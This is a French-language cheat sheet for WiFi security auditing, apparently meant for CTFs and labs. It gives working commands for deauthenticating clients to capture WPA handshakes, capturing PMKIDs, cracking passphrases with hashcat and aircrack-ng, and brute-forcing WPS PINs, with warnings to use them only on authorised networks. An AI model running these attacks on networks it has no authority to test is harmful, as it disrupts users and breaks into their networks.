# 📡 Cheat Sheet — Sécurité WiFi

Audit de réseaux sans fil (suite aircrack-ng, hcxtools, hashcat). À utiliser **uniquement** sur des réseaux que tu possèdes ou que tu es explicitement autorisé à auditer (lab, CTF).

---

## 1. Préparer l'interface (mode moniteur)

```bash
iwconfig                              # Lister les interfaces WiFi
sudo airmon-ng check kill             # Tuer les processus qui gênent (NetworkManager…)
sudo airmon-ng start wlan0            # Passer wlan0 en mode moniteur -> wlan0mon
iwconfig wlan0mon                     # Vérifier (Mode:Monitor)

# Alternative manuelle
sudo ip link set wlan0 down
sudo iw wlan0 set monitor control
sudo ip link set wlan0 up
```

Revenir en mode normal à la fin :
```bash
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

---

## 2. Reconnaissance (scan)

```bash
# Scan de tous les réseaux et clients à portée
sudo airodump-ng wlan0mon

# Scan ciblé sur un AP (une fois le BSSID et le canal repérés)
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon
```

Colonnes utiles : **BSSID** (MAC de l'AP), **PWR** (puissance), **CH** (canal),
**ENC/CIPHER/AUTH** (WPA2/WPA3…), **ESSID** (nom), **STATION** (clients connectés).

---

## 3. Capturer un handshake WPA/WPA2

```bash
# 1) Lancer la capture ciblée (laisser tourner)
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w handshake wlan0mon

# 2) Dans un autre terminal : déauthentifier un client pour forcer la reconnexion
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
#   -a = BSSID de l'AP   -c = MAC du client   (sans -c = broadcast)

# 3) Quand "WPA handshake: AA:BB:..." apparaît en haut d'airodump -> capturé !
```

Vérifier / nettoyer la capture :
```bash
aircrack-ng handshake-01.cap          # Doit indiquer "1 handshake"
```

---

## 4. Attaque PMKID (sans client, souvent plus propre)

```bash
# Capturer les PMKID
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# Convertir au format hashcat (mode 22000)
hcxpcapngtool -o hash.hc22000 capture.pcapng

# Idem pour convertir un .cap de handshake capturé via aircrack
hcxpcapngtool -o hash.hc22000 handshake-01.cap
```

---

## 5. Cracking (retrouver la passphrase)

### aircrack-ng (CPU, wordlist)
```bash
aircrack-ng -w rockyou.txt -b AA:BB:CC:DD:EE:FF handshake-01.cap
```

### hashcat (GPU, recommandé) — mode 22000 (WPA-PBKDF2/PMKID)
```bash
# Attaque par dictionnaire
hashcat -m 22000 hash.hc22000 rockyou.txt

# Dictionnaire + règles
hashcat -m 22000 hash.hc22000 rockyou.txt -r rules/best64.rule

# Masque (ex. 8 chiffres)
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d

# Afficher le résultat trouvé
hashcat -m 22000 hash.hc22000 --show
```

### Générer une wordlist ciblée
```bash
crunch 8 8 0123456789 -o num8.txt         # Tous les 8 chiffres
```

---

## 6. WPS (si activé sur l'AP)

```bash
sudo wash -i wlan0mon                      # Lister les AP avec WPS actif
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv   # Brute force du PIN WPS
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF            # Alternative
```

---

## 7. Automatisation & recon avancée

```bash
sudo wifite                               # Automatise capture + attaques (très pratique)
sudo kismet -c wlan0mon                    # Détection/monitoring avancé (GUI web)
```

---

## 8. Réflexe méthodologique

1. Interface en **mode moniteur** (`airmon-ng start`).
2. **Scanner** (`airodump-ng`) → noter BSSID, canal, clients.
3. **Capturer** : handshake (airodump + deauth) **ou** PMKID (hcxdumptool).
4. **Convertir** en `hc22000` (`hcxpcapngtool`).
5. **Cracker** avec hashcat/aircrack + bonne wordlist (rockyou, masques).
6. Le flag est souvent la **passphrase retrouvée** ou un contenu accessible une fois connecté.

> ⚠️ WPA3 (SAE) résiste à ces attaques hors-ligne classiques. La plupart des épreuves
> ciblent WPA/WPA2-PSK. N'audite que des réseaux autorisés.